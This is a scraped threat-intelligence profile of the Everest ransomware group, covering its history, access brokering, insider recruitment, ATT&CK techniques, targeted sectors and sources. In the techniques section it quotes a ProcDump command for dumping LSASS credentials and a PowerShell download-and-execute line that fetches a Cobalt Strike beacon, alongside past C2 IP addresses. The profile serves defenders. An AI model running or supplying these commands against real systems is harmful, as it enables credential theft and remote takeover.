</svg></div></a></div></div></div></div></div></div></div><div id="w-node-_743ffcfe-0999-a006-072a-b2f6e7900953-1d65211a" class="tg-conent-layout align-left"><div id="classifications" class="tg-section-content"><div class="tg-section-header-wrap margin-bottom margin-small"><h2 class="tg-header heading-style-h3">Classifications &amp; Affiliations</h2></div><div class="blog-rich-text is-tg w-richtext"><p><strong>Type:</strong> Closed Group with Initial Access Broker services and corporate insider recruitment operations </p><p>Everest operates a hybrid model combining direct ransomware with network access brokerage. <strong>IAB</strong> activities emerged <strong>November 2021</strong>, selling compromised credentials to other threat actors. The <strong>October 2023</strong> insider recruitment program offers cash payments and profit-sharing for remote access. Binary analysis reveals code connections to <strong>BlackByte</strong> ransomware family&#x27;s <strong>C#</strong> variant with local encryption key generation. Historical links to <strong>EverBe 2.0</strong> ransomware family. </p><p><strong>Current Status:</strong> Active as of <strong>October 2025,</strong> targeting critical infrastructure including national electricity transmission operators, aviation systems affecting multiple European airports, and telecommunications networks. </p></div><div class="tg-threat-level-wrap margin-top margin-small"><h5 class="threat-level heading-style-h5">Threat Level:</h5><div data-tg-threat="7" class="threat-level-number heading-style-h5 text-color-red">7</div></div></div><div class="tg-section-content margin-top margin-large"><div id="origins" class="section-inside"><div class="tg-section-header-wrap margin-bottom margin-small"><h2 class="tg-header heading-style-h3">Origins and Methodology</h2></div><div class="blog-rich-text is-tg w-richtext"><p>Everest maintains five years of operations through its hybrid model: ransomware + <strong>IAB</strong> services since <strong>November 2021</strong> + insider recruitment since <strong>October 2023</strong>. Three distinct revenue streams. In <strong>April 2025</strong>, the group&#x27;s dark web leak site was defaced with the message &quot;Don&#x27;t do crime CRIME IS BAD xoxo from Prague,&quot; possibly by rival group <strong>DragonForce</strong>, though attribution remains speculative. Operations recovered by mid-<strong>2025</strong>. </p><p>Technical operations rely on weaponizing specific legitimate tools: <strong>Cobalt Strike</strong>, <strong>ProcDump</strong>, <strong>SoftPerfect Network Scanner</strong>, <strong>WinRAR</strong>, <strong>AnyDesk</strong>, <strong>Splashtop</strong>, <strong>Atera</strong>. Defining characteristic: systematic deletion of all tools after each execution stage. <strong>BlackByte</strong> code connection manifests in local encryption key generation rather than server-based distribution. </p></div></div><div id="evolution" class="section-inside"><div class="margin-top margin-medium"><div class="w-embed"><h5> What is the Evolution of Everest Ransomware? </h5></div></div><div class="margin-top margin-small"><div data-accordion="component" class="tg-accordion-wrap"><div data-accordion="item" class="tl-accordion-card background-color-midnight active"><div class="tg-accordion-number"><div data-accordion="content" class="slideup-tab_number active">0.1</div></div><div class="tg-accordion_content"><div class="tg-accordion-top"><div class="text-size-large text-style-allcaps text-weight-bold text-color-red">Formation</div></div><div data-accordion="content" class="tg-accordion-text-warp active"><div class="tg-accordion_clip"><div class="tg-accordion_content_inside"><div class="blog-rich-text is-mo w-richtext"><p>Initial emergence <strong>December 2020</strong> focused on data exfiltration without encryption, primarily targeting Canadian organizations. Early operations established reconnaissance methodologies, credential harvesting using <strong>ProcDump</strong> against <strong>LSASS</strong>, and <strong>WinRAR</strong>-based data archiving. </p><p>Transition to full ransomware occurred in early <strong>2021</strong> with dual <strong>AES/DES</strong> encryption and <strong>double extortion</strong>. Russia-based attribution from Russian-language operations and targeting patterns avoiding post-Soviet states.</p></div></div></div></div></div><div class="tg-accordion_arrow"><div data-accordion="content" id="w-node-b4eed0ee-e1ea-08c5-b77f-48e6ba1a9660-1d65211a" class="accordion-dropdown-button active"><div data-accordion="content" class="accordion-dropdown-arrow active w-embed"><svg width="100%" height="100%" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15.1982 24.5569V4.32458M15.1982 4.32458L25.3143 14.4407M15.1982 4.32458L5.08203 14.4407" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg></div></div></div></div><div data-accordion="item" class="tl-accordion-card background-color-midnight"><div class="tg-accordion-number"><div data-accordion="content" class="slideup-tab_number">0.2</div></div><div class="tg-accordion_content"><div class="tg-accordion-top"><div class="text-size-large text-style-allcaps text-weight-bold text-color-red">EVOLUTION</div></div><div data-accordion="content" class="tg-accordion-text-warp"><div class="tg-accordion_clip"><div class="tg-accordion_content_inside"><div class="blog-rich-text is-mo w-richtext"><p>Initial months concentrated on data exfiltration capabilities and dark web leak site infrastructure. <strong>May 2021</strong> voluntary leak site takedown during broader ransomware law enforcement crackdown represented operational security adjustment. Operations resumed mid-<strong>2021</strong> with reduced profile. </p><p><strong>November 2021</strong> pivot to <strong>IAB</strong> services marked business model evolution, with substantial uptick from <strong>November 2022</strong>. Revenue diversification through network access sales. <strong>October 2023</strong> insider recruitment program launched on dark web forums, offering cash/profit-sharing for employee-provided access to <strong>US</strong>, <strong>Canada</strong>, <strong>Europe</strong> organizations.  </p><p>Current operations since <strong>2024</strong> show shift toward data-only extortion without encryption. </p><p><strong>September 2025 critical infrastructure attacks:</strong> Everest claimed on their leak site in October to have compromised aviation systems at Heathrow, Brussels, and Berlin airports. The group also claimed October 2025 attacks on a European national electricity grid and telecommunications networks. These <strong>claims remain unverified</strong> by independent sources as of October 2025.</p></div></div></div></div></div><div class="tg-accordion_arrow"><div data-accordion="content" id="w-node-a3a4b8b0-9c04-88b0-db6c-d222e91051dd-1d65211a" class="accordion-dropdown-button"><div data-accordion="content" class="accordion-dropdown-arrow w-embed"><svg width="100%" height="100%" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15.1982 24.5569V4.32458M15.1982 4.32458L25.3143 14.4407M15.1982 4.32458L5.08203 14.4407" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg></div></div></div></div><div data-accordion="item" class="tl-accordion-card background-color-midnight"><div class="tg-accordion-number"><div data-accordion="content" class="slideup-tab_number">0.3</div></div><div class="tg-accordion_content"><div class="tg-accordion-top"><div class="text-size-large text-style-allcaps text-weight-bold text-color-red"><strong>Lineage/Connections</strong></div></div><div data-accordion="content" class="tg-accordion-text-warp"><div class="tg-accordion_clip"><div class="tg-accordion_content_inside"><div class="blog-rich-text is-mo w-richtext"><p>Code analysis reveals relationship to <strong>BlackByte</strong> ransomware family&#x27;s <strong>C#</strong> variant. Key architectural feature: local encryption key generation on compromised hosts rather than downloading from <strong>C2</strong> servers. </p><p>Early file extension patterns.[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="345142514651474074555d4659555d581a5757">[email&#160;protected]</a>].EVEREST connect to <strong>EverBe 2.0</strong> ransomware family (Embrace, PainLocker, EvilLocker, Hyena Locker variants). Joint victim announcement with <strong>Ransomed</strong> ransomware group <strong>September 2023</strong>.</p></div></div></div></div></div><div class="tg-accordion_arrow"><div data-accordion="content" id="w-node-_045b0cf0-02d8-1ce5-08d5-826a692b9e18-1d65211a" class="accordion-dropdown-button"><div data-accordion="content" class="accordion-dropdown-arrow w-embed"><svg width="100%" height="100%" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15.1982 24.5569V4.32458M15.1982 4.32458L25.3143 14.4407M15.1982 4.32458L5.08203 14.4407" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg></div></div></div></div></div></div></div><div id="techniques" class="section-inside"><div class="margin-top margin-medium"><div class="w-embed"><h5> Which Unique Techniques Does Everest Use? </h5></div></div><div class="margin-top margin-small"><div class="blog-rich-text is-tg w-richtext"><p>Attack chains begin with three primary initial access methods specific to this group&#x27;s operations: exploiting exposed <strong>RDP</strong> services, purchasing credentials from other <strong>Initial Access Brokers</strong>, or leveraging the corporate insider recruitment program active since <strong>October 2023</strong>. No specific <strong>CVE</strong> exploitation observed. Target selection shows particular concentration on <strong>US healthcare</strong> entities, especially medical imaging providers subjected to 24-hour negotiation deadlines.</p><div class="w-embed"><table class="data-table">
    <tbody>
        <tr>
            <th><p>TECHNIQUE</p></th>
            <th><p>DETAILS</p></th>
        </tr>
        <tr>
            <td><p>Infection Vectors</p></td>
            <td><p>Internet-exposed <strong>RDP</strong> without <strong>MFA</strong>; vulnerable <strong>VPN</strong> endpoints; credentials purchased from <strong>Initial Access Brokers</strong>; corporate insider recruitment with cash payments since <strong>October 2023</strong>; phishing; unpatched public-facing applications</p></td>
        </tr>
        <tr>
            <td><p>Target Selection</p></td>
            <td><p><strong>United States</strong> (over one-third of victims), <strong>Europe</strong>, emerging <strong>Middle East</strong>; healthcare disproportionately targeted (over one-quarter of <strong>US</strong> victims); financial services, legal services, construction, government, manufacturing, aviation; organizations with <strong>HIPAA</strong> and <strong>GDPR</strong> protected data</p></td>
        </tr>
        <tr>
            <td><p>Operational Complexity</p></td>
            <td><p>Specific toolkit: <strong>Cobalt Strike</strong>, <strong>ProcDump</strong>, <strong>SoftPerfect Network Scanner</strong>, <strong>WinRAR</strong>, <strong>AnyDesk</strong>, <strong>Splashtop</strong>, <strong>Atera</strong>; complete tool deletion after each stage; local key generation from <strong>BlackByte</strong> lineage; three remote access tools as <strong>Windows</strong> services</p></td>
        </tr>
    </tbody>
</table></div></div></div></div></div><div id="features" class="tg-section-content margin-top margin-large"><div class="tg-section-header-wrap margin-bottom margin-small"><h2 class="tg-header heading-style-h3">Key Features &amp; Technical Details</h2></div><div class="margin-top margin-small"><div class="blog-rich-text is-tg w-richtext"><p><strong>Windows</strong>-focused <strong>C#</strong> ransomware with dual encryption algorithms and local key generation. No public decryption tools available.</p><div class="w-embed"><table class="data-table">
    <tbody>
        <tr>
            <th><p>FEATURE</p></th>
            <th><p>DETAILS</p></th>
        </tr>
        <tr>
            <td><p><strong>Encryption Method</strong></p></td>
            <td><p>Dual algorithm implementation combining <strong>AES (Advanced Encryption Standard)</strong> and <strong>DES (Data Encryption Standard)</strong> with local key generation on compromised hosts ensuring encryption capability independent of <strong>C2</strong> connectivity; keys not transmitted to external servers during encryption process complicating recovery efforts</p></td>
        </tr>
        <tr>
            <td><p><strong>File Extension</strong></p></td>
            <td><p><code>.EVEREST</code> or <code>.everest</code> appended to encrypted files; historical variants used longer extensions including <code>.[<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6c091a091e091f182c0d051e010d0500420f0f">[email&#160;protected]</a>].EVEREST</code> connecting to <strong>EverBe 2.0</strong> family lineage</p></td>
        </tr>
        <tr>
            <td><p><strong>Ransom Note</strong></p></td>
            <td><p><code>EVEREST LOCKER .txt</code> delivered as primary ransom note in English; some variants deploy files with Chinese Unicode names; displayed via pop-up windows or text files appearing on desktops and in folders containing encrypted files; 24-hour negotiation deadlines particularly for healthcare targets exploiting operational urgency</p></td>
        </tr>
        <tr>
            <td><p><strong>Double Extortion</strong></p></td>
            <td><p>Pre-encryption data exfiltration using <strong>WinRAR</strong> archiving and <strong>Splashtop</strong> file transfer capabilities; dark web leak site infrastructure for victim naming and stolen data publication with countdown timers; staged data releases including proof samples, partial leaks, and full dumps; increasing shift toward data-only extortion without encryption threatening publication or sale while avoiding ransomware deployment complexity</p></td>
        </tr>
        <tr>
            <td><p><strong>Communication Channels</strong></p></td>
            <td><p><strong>Cobalt Strike</strong> beacons over <strong>HTTPS</strong> on ports <strong>8080</strong> and <strong>10443</strong> for primary <strong>C2</strong> communications; secondary channels through installed remote access tools including <strong>AnyDesk</strong>, <strong>Splashtop</strong>, and <strong>Atera</strong>; dark web leak site accessible via <strong>TOR</strong> network for victim negotiations and data publication; direct negotiation channels provided in ransom notes</p></td>
        </tr>
        <tr>
            <td><p><strong>Deployment Speed</strong></p></td>
            <td><p>Multi-stage attack execution spanning reconnaissance, credential harvesting, lateral movement, and data exfiltration before encryption deployment; typical dwell time ranges from days to weeks enabling comprehensive network mapping and high-value data identification; 24-hour negotiation deadlines following encryption particularly targeting healthcare sector operational urgency</p></td>
        </tr>
        <tr>
            <td><p><strong>Payment Method</strong></p></td>
            <td><p>Cryptocurrency with preference for <strong>Monero (XMR)</strong> over <strong>Bitcoin (BTC)</strong> due to enhanced privacy features; reportedly charges premium for <strong>Bitcoin</strong> payments to compensate for increased traceability risk; wallet addresses rotate per incident and provided directly to victims through negotiation channels</p></td>
        </tr>
        <tr>
            <td><p><strong>Operational Model</strong></p></td>
            <td><p>Closed group with multi-stream revenue including ransom payments for decryption, data non-disclosure extortion, direct data sales on dark web markets (documented prices ranging from tens of thousands to hundreds of thousands in cryptocurrency), network access brokerage to other ransomware operators and threat actors since <strong>November 2021</strong>, corporate insider recruitment with profit-sharing arrangements since <strong>October 2023</strong></p></td>
        </tr>
    </tbody>
</table></div></div></div></div><div class="tg-section-content margin-top margin-large"><div id="activities" class="section-inside"><div class="tg-section-header-wrap margin-bottom margin-small"><h2 class="tg-header heading-style-h3">Activities</h2></div><div class="margin-top margin-small"><div class="blog-rich-text is-tg w-richtext"><p>Sustained tempo through five years. Claimed September 2025 aviation system attacks at Heathrow/Brussels/Berlin airports. October 2025 saw continued escalation with claimed attacks against Swedish national power grid and telecommunications networks. United States represents over one-third of victims. Europe and the emerging Middle East <strong>represent</strong> additional hotspots (UAE, Saudi Arabia, Gulf states). </p></div></div></div><div id="indistry" class="margin-top margin-small"><div class="blog-rich-text is-tg w-richtext"><h4>Which Industries Are Most Vulnerable to Everest?</h4><p><strong>Healthcare</strong> is targeted, representing over one-quarter of <strong>US</strong> victims. The group specifically targets <strong>medical imaging</strong> providers with 24-hour deadlines exploiting patient care urgency and <strong>HIPAA</strong> pressures.  Additional sectors: <strong>financial services</strong>, <strong>legal and professional services</strong>, <strong>construction</strong>, <strong>government and public sector</strong>, <strong>manufacturing</strong>, <strong>technology</strong>, <strong>retail</strong>, <strong>aviation and aerospace</strong>, <strong>energy and utilities</strong>.</p></div></div><div class="margin-top margin-small"><div class="tg-recents-attacks"><div class="tg-section-header-wrap margin-bottom margin-xsmall"><h2 class="tg-header heading-style-h5">HAL Most Recent Attacks</h2></div><div class="cms-attacks_list-wrapper No specific <strong>CVE</strong> exploitation. </p><p>Valid Accounts (<strong>T1078</strong>) via three methods: credentials purchased from other <strong>IABs</strong> (active since <strong>November 2021</strong>), credential stuffing, and corporate insider recruitment (<strong>October 2023</strong>) offering cash/profit-sharing for direct network access to <strong>US</strong>, <strong>Canada</strong>, <strong>Europe</strong> organizations. </p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Network Service Discovery (<strong>T1046</strong>) using netscan.exe, netscanpack.exe, and <strong>SoftPerfect Network Scanner</strong> to enumerate topology, identify domain controllers/file servers, scan ports, discover shares, and retrieve device information via <strong>WMI</strong>, <strong>SNMP</strong>, <strong>HTTP</strong>, <strong>SSH</strong>, <strong>PowerShell</strong>. </p><p>Output consistently saved as subnets.txt and trustdumps.txt in C:\Users\Public\Downloads\ before deletion.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Remote Access Software (<strong>T1219</strong>) consistently installing three tools across all operations: <strong>AnyDesk</strong>, <strong>Splashtop</strong>, <strong>Atera</strong> as <strong>Windows</strong> services. Triple-redundancy ensures persistence via service autostart and provides backup <strong>C2</strong> independent of <strong>Cobalt Strike</strong>.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Indicator Removal (<strong>T1070.004</strong>) defines operations: systematic removal of all tools after each execution stage. </p><p>‍<strong>SoftPerfect Network Scanner</strong> deleted after reconnaissance, subnets.txt/trustdumps.txt after processing, <strong>WinRAR</strong> archives after exfiltration, <strong>ProcDump</strong> and <strong>LSASS</strong> dumps after credential extraction. Stage-by-stage cleanup distinguishes from groups leaving artifacts throughout attack chains.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>OS Credential Dumping: <strong>LSASS</strong> Memory (<strong>T1003.001</strong>) using <strong>ProcDump</strong> with consistent command: C:\Users&lt;user&gt;\Desktop\procdump64.exe -ma lsass.exe C:\Users&lt;user&gt;\Desktop\lsass&lt;domain&gt;.dmp. Dumps saved to user desktops with domain-specific naming, extracting passwords, <strong>NTLM</strong> hashes, <strong>Kerberos</strong> tickets. </p><p>OS Credential Dumping: <strong>NTDS</strong> (<strong>T1003.003</strong>) copying NTDS.dit <strong>Active Directory</strong> database, consistently packaged as ntds.dit.zip for offline extraction.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Application Layer Protocol (<strong>T1071.001</strong>) with <strong>Cobalt Strike</strong> over <strong>HTTPS</strong> on ports <strong>8080</strong> (beacon hosting) and <strong>10443</strong> (<strong>C2</strong>). Beacon deployment via <strong>PowerShell</strong>: powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;&lt;IP Address&gt;/a&#x27;)). Historical infrastructure: <strong>AWS EC2</strong> 3.22.79.23, 18.193.71.144, plus European 45.84.0.164. </p><p>Remote Access Software (<strong>T1219</strong>) providing backup <strong>C2</strong> via <strong>AnyDesk</strong>, <strong>Splashtop</strong>, <strong>Atera</strong>.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Remote Services utilizing Remote Desktop Protocol (<strong>T1021.001</strong>) with compromised legitimate user accounts for network traversal. <strong>RDP</strong> lateral movement exploits inadequate network segmentation and excessive user privileges.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Exfiltration Over <strong>C2</strong> Channel (<strong>T1041</strong>) using <strong>Splashtop</strong> file transfer specifically (not other remote access tools). <strong>WinRAR</strong> archives data before <strong>Splashtop</strong> transfer. Pre-encryption exfiltration enables data-only extortion. Documented targets: medical records (healthcare), customer data (financial services), legal documents (law firms), intellectual property (manufacturing).</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Create or Modify System Process targeting <strong>Windows</strong> Service (<strong>T1543.003</strong>) installing remote desktop software tools including <strong>AnyDesk</strong>, <strong>Splashtop Remote Desktop</strong>, and <strong>Atera</strong> as <strong>Windows</strong> services. Service-based persistence ensures automatic startup across system reboots and survives intermediate remediation efforts.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Data encryption disrupts operations requiring restoration. Healthcare faces elevated impact: patient care interruption, appointment cancellations, medical device unavailability, and patient safety risks. Data exfiltration creates regulatory consequences: <strong>HIPAA</strong> penalties (healthcare), <strong>GDPR</strong> enforcement (Europe), notification requirements, litigation. </p><p>Financial impact beyond ransoms: restoration costs, business interruption, regulatory penalties, legal expenses, insurance premium increases. Downtime: days to weeks depending on backups.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Data Encrypted for Impact (<strong>T1486</strong>) deploying dual <strong>AES/DES</strong> with .EVEREST or .everest extension. Defining characteristic from <strong>BlackByte</strong> lineage: local key generation on each host (not downloaded from <strong>C2</strong> servers), ensuring encryption survives infrastructure disruption. Ransom note: EVEREST LOCKER .txt. Operational shift since <strong>2024</strong> toward data-only extortion without encryption.</p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Double extortion: encryption + pre-exfiltration data theft threatening dark web publication. Pressure mechanisms: staged releases (proof samples → partial → full), countdown timers, regulatory agency threats. </p><p><strong>Healthcare-specific tactic:</strong> 24-hour deadlines for healthcare targets (documented across medical imaging attacks) exploiting patient care dependencies and <strong>HIPAA</strong> penalties. This compressed timeline distinguishes healthcare from other sectors. Recent operations: password-protected dark web postings. </p></div></div><div role="tabpanel" class="tabs_content_item"><div class="tabs_header">Details</div><div class="blog-rich-text is-tg is-mo w-richtext"><p>Stage-by-stage deletion distinguishes operations. After reconnaissance: netscan.exe, netscanpack.exe, <strong>SoftPerfect Network Scanner</strong> removed. After processing: subnets.txt, trustdumps.txt deleted from C:\Users\Public\Downloads. After exfiltration: <strong>WinRAR</strong> archives removed. After credential harvesting: <strong>ProcDump</strong>, <strong>LSASS</strong> dumps deleted from user desktops. Cleanup occurs after each stage, not at attack conclusion.</p></div></div></div></div></div><div class="tabs_js w-embed w-script"><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
document.addEventListener("DOMContentLoaded", function () {
	document.querySelectorAll(".tabs_wrap").forEach((tabWrap, componentIndex) => {
		if (tabWrap.dataset.scriptInitialized) return;
		tabWrap.dataset.scriptInitialized = "true";

		const allowLoop = tabWrap.getAttribute("data-allow-loop") === "true",
			defaultTab = +tabWrap.getAttribute("data-default-tab") || 0,
			buttonList = tabWrap.querySelector(".tabs_button_list"),
			buttonItems = tabWrap.querySelectorAll(".tabs_button_item"),
			panelList = tabWrap.querySelector(".tabs_content_list"),
			panelItems = tabWrap.querySelectorAll(".tabs_content_item"),
			previousButton = tabWrap.querySelector(".tabs_control_button.is-previous"),
			nextButton = tabWrap.querySelector(".tabs_control_button.is-next");

		if (!buttonList || !panelList || !buttonItems.length || !panelItems.length) {
			console.warn("Missing elements in:", tabWrap);
			return;
		}

		panelList.removeAttribute("role");
		buttonList.setAttribute("role", "tablist");
		buttonItems.forEach((btn) => btn.setAttribute("role", "tab"));
		panelItems.forEach((panel) => panel.setAttribute("role", "tabpanel"));

		let activeIndex = defaultTab;
		const makeActive = (index, focus = true) => {
			activeIndex = index;
			buttonItems.forEach((btn, i) => {
				btn.classList.toggle("is-active", i === index);
				btn.setAttribute("aria-selected", i === index ? "true" : "false");
				btn.setAttribute("tabindex", i === index ? "0" : "-1");
			});
			panelItems.forEach((panel, i) => panel.classList.toggle("is-active", i === index));
			if (typeof ScrollTrigger !== "undefined") ScrollTrigger.refresh();
			if (nextButton) nextButton.disabled = index === buttonItems.length - 1 && !allowLoop;
			if (previousButton) previousButton.disabled = index === 0 && !allowLoop;
			if (focus) buttonItems[index].focus();
		};

		makeActive(defaultTab, false);

		const updateIndex = (delta) => makeActive((activeIndex + delta + buttonItems.length) % buttonItems.length);
		nextButton?.addEventListener("click", () => updateIndex(1));
		previousButton?.addEventListener("click", () => updateIndex(-1));

		buttonItems.forEach((btn, index) => {
			btn.setAttribute("id", "tabs_button_" + componentIndex + "_" + index);
			btn.setAttribute("aria-controls", "tabs_panel_" + componentIndex + "_" + index);
			panelItems[index].setAttribute("id", "tabs_panel_" + componentIndex + "_" + index);
			panelItems[index].setAttribute("aria-labelledby", btn.id);
			btn.addEventListener("click", () => makeActive(index));
			btn.addEventListener("keydown", (e) => {
				if (["ArrowRight", "ArrowDown"].includes(e.key)) updateIndex(1);
				else if (["ArrowLeft", "ArrowUp"].includes(e.key)) updateIndex(-1);
			});
		});
	});
});
</script></div></div></div></div><div id="indicators" class="tg-section-content margin-top margin-large"><div class="tg-section-header-wrap margin-bottom margin-small"><h2 class="tg-header heading-style-h3">Indicators of Compromise (IOCs)</h2></div><div class="margin-top margin-small"><div class="blog-rich-text is-tg w-richtext"><p>Network and host-based indicators enable detection across compromised environments.</p><div class="w-embed"><table class="data-table">

</table></div></div></div></div><div id="exploits" class="tg-section-content margin-top margin-large"><div class="tg-section-header-wrap margin-bottom margin-small"><h2 class="tg-header heading-style-h3">Exploits and Vulnerabilities</h2></div><div class="margin-top margin-small"><div class="blog-rich-text is-tg w-richtext"><p>No specific <strong>CVE</strong> exploitation. Initial access relies on common misconfigurations. </p><p><strong>Additional Attack Vectors:</strong> </p><p><strong>Exposed Remote Services:</strong> Internet-exposed <strong>RDP</strong>, <strong>VPN</strong> without <strong>MFA</strong> via <strong>T1133</strong>. </p><p><strong>Weak Authentication:</strong> Inadequate passwords, missing <strong>MFA</strong> via <strong>T1078</strong>. </p><p><strong>Unpatched Applications:</strong> Outdated internet-facing software via <strong>T1190</strong>. </p><p><strong>Purchased Access:</strong> Compromised credentials from dark web. </p><p><strong>Corporate Insiders:</strong> Cash/profit-sharing recruitment since <strong>October 2023</strong>. </p></div></div></div></div></div></div></div></div></div></header><section class="section_sources"><div class="padding-global"><div class="container-medium"><div class="padding-section-medium"><div id="sources" class="tg-sources_wrap"><div class="tg-sources_layout"><div class="tg-sources_content-left"><div class="tg-section-header-wrap"><h2 class="tg-header heading-style-h3">Sources</h2></div></div><div class="tg-sources_content-right"><div class="blog-rich-text is-mo w-richtext"><ul role="list"><li><a target="_blank" href="https://www.hipaajournal.com/wp-content/uploads/2024/08/hhs-hc3-everest-ransomware-group-threat-profile-aug-2024.pdf" data-wf-native-id-path="751e1dda-23a8-e5d1-e528-4208041d1b73" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="751e1dda-23a8-e5d1-e528-4208041d1b73">U.S. Department of Health and Human Services HC3: Threat Actor Profile - Everest Ransomware Group (August 2024)</a></li><li>‍<a target="_blank" href="https://www.nccgroup.com/us/research-blog/climbing-mount-everest-black-byte-bytes-back/" data-wf-native-id-path="4df30444-6f8b-af80-74fc-c245b0b07605" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="4df30444-6f8b-af80-74fc-c245b0b07605">NCC Group: Climbing Mount Everest - Black-Byte Bytes Back? <script>
document.addEventListener('DOMContentLoaded', function() {
     
    // Menu back button functionality
    initMenuBackButtons();
    
    // Mobile menu toggle
    initMobileMenuToggle();
    
    // Handle menu overflow on mobile
    if (window.innerWidth < 991) {
        handleMenuToggle();
    }
    
    // Add rel attributes to external links
    addRelToExternalLinks();
});


// Menu back button functionality
function initMenuBackButtons() {
    const closeIcons = document.querySelectorAll('.is-back');
    
    closeIcons.forEach(function(closeIcon) {
        closeIcon.addEventListener('click', function() {
            const dropdownLists = document.querySelectorAll('.navbar_dropdown-list');
            const dropdownToggles = document.querySelectorAll('.navbar_dropdown-toggle');
            
            dropdownLists.forEach(function(dropdownList) {
                dropdownList.classList.remove('w--open');
            });
            
            dropdownToggles.forEach(function(dropdownToggle) {
                dropdownToggle.classList.remove('w--open');
            });
        });
    });
}

// Mobile menu toggle functionality
function initMobileMenuToggle() {
    let numOfClicks = 0;
    const trigger = document.getElementById("navMenuButton");
    const bodyEl = document.getElementsByTagName("body")[0];
    const menuButton = document.querySelector('.navbar_menu-button');
    
    // Nav menu button click handler
    if (trigger) {
        trigger.onclick = () => {
            numOfClicks += 1;
            const isNumOfClicksEven = numOfClicks % 2 === 0;
            bodyEl.style.overflow = isNumOfClicksEven ? "auto" : "hidden";
        };
    }
    
    // Mobile class toggle
    if (menuButton) {
        menuButton.addEventListener('click', function() {
            const navbar = document.querySelector('.navbar');
            const pillContainer = document.querySelector('.navbar_pill-container');
            
            navbar.classList.toggle('mobile');
            pillContainer.classList.toggle('mobile');
        });
    }
}

// Handle menu overflow settings
function handleMenuToggle() {
    const navbarMenu = document.querySelector(".navbar_menu");
    
    if (navbarMenu) {
        navbarMenu.style.overflowY = "clip";
    }
    
    const backElements = document.querySelectorAll(".is-back");
    const mobileMenuElements = document.querySelectorAll("[data-mobile-menu]");
    
    mobileMenuElements.forEach(element => {
        element.addEventListener("click", function() {
            if (navbarMenu) {
                navbarMenu.style.overflow = "auto";
            }
        });
    });
    
    backElements.forEach(element => {
        element.addEventListener("click", function() {
            if (navbarMenu) {
                navbarMenu.style.overflowY = "clip";
            }
        });
    });
}

// Add rel attributes to external links
function addRelToExternalLinks() {
    const externalLinks = document.querySelectorAll('a[target="_blank"]');
    
    externalLinks.forEach(function(link) {
        let relAttr = link.getAttribute('rel') || '';
        
        ['noopener', 'noreferrer', 'nofollow'].forEach(val => {
            if (!relAttr.includes(val)) {
                relAttr += (relAttr ? ' ' : '') + val;
            }
        });
        
        link.setAttribute('rel', relAttr);
    });
}
// Window resize handlers


</script>
<script>
function initCustomCursor() {
  if (window.innerWidth <= 991) return;

  const tricksCursor = document.querySelector('.cursor');
  const excludeClass = 'w-variant-231efe4b-31e7-5bae-7c6b-387d3e7e9738';
  const hoverElements = document.querySelectorAll(
    `.navbar_dropdown-toggle, .navbar_dropdown_link, .button-dropdown:not(.${excludeClass})`
  );

  // Hide custom cursor entirely over the excluded variant
  document.querySelectorAll(`.button-dropdown.${excludeClass}`).forEach(el => {
    el.addEventListener('mouseenter', () => tricksCursor.style.opacity = '0');
    el.addEventListener('mouseleave', () => tricksCursor.style.opacity = '');
  });
  let isFollowingMouse = true;
  let currentTarget = { x: 0, y: 0, width: null, height: null };
  let actualPosition = { x: 0, y: 0 };
  let animationId = null;
  const smoothing = 0.2;

  function lerp(start, end, factor) {
    return start + (end - start) * factor;
  }

  function isDescriptionMultiLine(buttonDropdown) {
    const desc = buttonDropdown.querySelector('.featured-link-description');
    if (!desc) return false;
    const lineHeight = parseFloat(getComputedStyle(desc).lineHeight) || desc.offsetHeight;
    return desc.offsetHeight > lineHeight * 1.2;
  }

  function animate() {
    actualPosition.x = lerp(actualPosition.x, currentTarget.x, smoothing);
    actualPosition.y = lerp(actualPosition.y, currentTarget.y, smoothing);
    tricksCursor.style.left = actualPosition.x + 'px';
    tricksCursor.style.top = actualPosition.y + 'px';
    if (currentTarget.width !== null) {
      tricksCursor.style.width = currentTarget.width + 'px';
      tricksCursor.style.height = currentTarget.height + 'px';
    }
    animationId = requestAnimationFrame(animate);
  }

  animate();

  window.addEventListener('mousemove', (e) => {
    if (isFollowingMouse) {
      currentTarget.x = e.clientX;
      currentTarget.y = e.clientY;
    }
  });

  hoverElements.forEach(element => {
    let updateInterval;

    element.addEventListener('mouseenter', function () {
      isFollowingMouse = false;

      // Set border-radius based on description line count
